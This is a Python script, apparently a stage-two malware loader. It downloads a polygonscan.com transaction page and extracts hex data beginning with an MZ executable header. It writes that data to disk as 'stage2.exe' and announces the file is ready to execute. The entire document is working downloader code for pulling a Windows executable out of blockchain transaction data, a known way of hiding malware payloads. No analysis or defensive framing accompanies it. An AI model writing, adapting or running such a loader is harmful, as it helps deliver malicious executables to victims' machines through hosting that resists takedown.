import re
import requests
import sys

tx_hash = ""
url = f"https://polygonscan.com/tx/{tx_hash}"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml",
    "Accept-Language": "en-US,en;q=0.9",
}

print("[*] Fetching transaction page from polygonscan.com...")
response = requests.get(url, headers=headers, timeout=30)

if response.status_code != 200:
    print(f"[!] Failed to fetch page. HTTP Status: {response.status_code}")
    sys.exit(1)

pattern = r'0x[0-9a-fA-F]{100,}'  # Long hex string
matches = re.findall(pattern, response.text)

if not matches:
    print("[!] Could not find input data on page")
    print("[*] The page structure may have changed. Trying alternative method...")
    
    hex_pattern = r'[0-9a-fA-F]{100,}'
    all_hex = re.findall(hex_pattern, response.text)
    
    for hex_str in all_hex:
        if hex_str.lower().startswith('4d5a'):
            hex_payload = hex_str
            break
    else:
        print("[!] No executable payload found on the page")
        sys.exit(1)
else:
    hex_payload = matches[0]
    if hex_payload.startswith('0x'):
        hex_payload = hex_payload[2:]

print(f"[*] Extracted hex payload length: {len(hex_payload)} characters")
print(f"[*] First 20 bytes: {hex_payload[:40]}...")

if not hex_payload.lower().startswith('4d5a'):
    print("[!] Warning: Payload does not start with MZ (not an executable)")
    print("[*] Saving anyway, but may not be valid")

try:
    payload_bytes = bytes.fromhex(hex_payload)
    with open("stage2.exe", "wb") as f:
        f.write(payload_bytes)
    print(f"[✓] Success! Saved as stage2.exe ({len(payload_bytes)} bytes)")
    print("[✓] File is ready to execute")
except ValueError as e:
    print(f"[!] Invalid hex data: {e}")
    sys.exit(1)
